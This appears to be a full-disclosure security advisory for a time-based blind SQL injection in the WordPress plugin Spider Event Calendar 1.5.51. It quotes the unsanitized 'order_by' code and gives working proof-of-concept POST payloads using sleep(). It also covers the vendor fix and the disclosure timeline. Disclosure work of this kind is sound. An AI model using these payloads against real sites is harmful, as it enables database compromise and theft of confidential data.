@@ -1,0 +1,97 @@
+=============================================
+MGC ALERT 2017-003
+- Original release date: April 06, 2017
+- Last revised:  April 10, 2017
+- Discovered by: Manuel García Cárdenas
+- Severity: 7,1/10 (CVSS Base Score)
+=============================================
+
+I. VULNERABILITY
+-------------------------
+WordPress Plugin Spider Event Calendar 1.5.51 - Blind SQL Injection
+
+II. BACKGROUND
+-------------------------
+WordPress event calendar is a FREE user-friendly responsive plugin to
+manage multiple recurring events and with various options.
+
+III. DESCRIPTION
+-------------------------
+This bug was found using the portal in the files:
+
+/spider-event-calendar/calendar_functions.php:      if
+(isset($_POST['order_by'])) {
+/spider-event-calendar/widget_Theme_functions.php:    if
+(isset($_POST['order_by']) && $_POST['order_by'] != '') {
+
+And when the query is executed, the parameter "order_by" it is not
+sanitized:
+
+/spider-event-calendar/front_end/frontend_functions.php:  $rows =
+$wpdb->get_results($query." ".$order_by);
+
+To exploit the vulnerability only is needed use the version 1.0 of the HTTP
+protocol to interact with the application.
+
+It is possible to inject SQL code.
+
+IV. PROOF OF CONCEPT
+-------------------------
+The following URL have been confirmed to all suffer from Time Based SQL
+Injection.
+
+Time Based SQL Injection POC:
+
+POST /wordpress/wp-admin/admin.php?page=SpiderCalendar HTTP/1.1
+
+search_events_by_title=&page_number=1&serch_or_not=&nonce_sp_cal=1e91ab0f6b&_wp_http_referer=%2Fwordpress%2Fwp-admin%2Fadmin.php%3Fpage%3DSpiderCalendar&id_for_playlist=&asc_or_desc=1&order_by=id%2c(select*from(select(sleep(2)))a)
+(2 seconds of response)
+
+search_events_by_title=&page_number=1&serch_or_not=&nonce_sp_cal=1e91ab0f6b&_wp_http_referer=%2Fwordpress%2Fwp-admin%2Fadmin.php%3Fpage%3DSpiderCalendar&id_for_playlist=&asc_or_desc=1&order_by=id%2c(select*from(select(sleep(30)))a)
+(30 seconds of response)
+
+V. BUSINESS IMPACT
+-------------------------
+Public defacement, confidential data leakage, and database server
+compromise can result from these attacks. Client systems can also be
+targeted, and complete compromise of these client systems is also possible.
+
+VI. SYSTEMS AFFECTED
+-------------------------
+Spider Event Calendar <= 1.5.51
+
+VII. SOLUTION
+-------------------------
+Vendor release a new version.
+https://downloads.wordpress.org/plugin/spider-event-calendar.1.5.52.zip
+
+VIII. REFERENCES
+-------------------------
+https://es.wordpress.org/plugins/spider-event-calendar/
+
+IX. CREDITS
+-------------------------
+This vulnerability has been discovered and reported
+by Manuel García Cárdenas (advidsec (at) gmail (dot) com).
+
+X. REVISION HISTORY
+-------------------------
+April 06, 2017 1: Initial release
+April 10, 2017 2: Revision to send to lists
+
+XI. DISCLOSURE TIMELINE
+-------------------------
+April 06, 2017 1: Vulnerability acquired by Manuel Garcia Cardenas
+April 06, 2017 2: Send to vendor
+April 07, 2017 3: Vendor fix the vulnerability and release a new version
+April 10, 2017 4: Send to the Full-Disclosure lists
+
+XII. LEGAL NOTICES
+-------------------------
+The information contained within this advisory is supplied "as-is" with no
+warranties or guarantees of fitness of use or otherwise.
+
+XIII. ABOUT
+-------------------------
+Manuel Garcia Cardenas
+Pentester
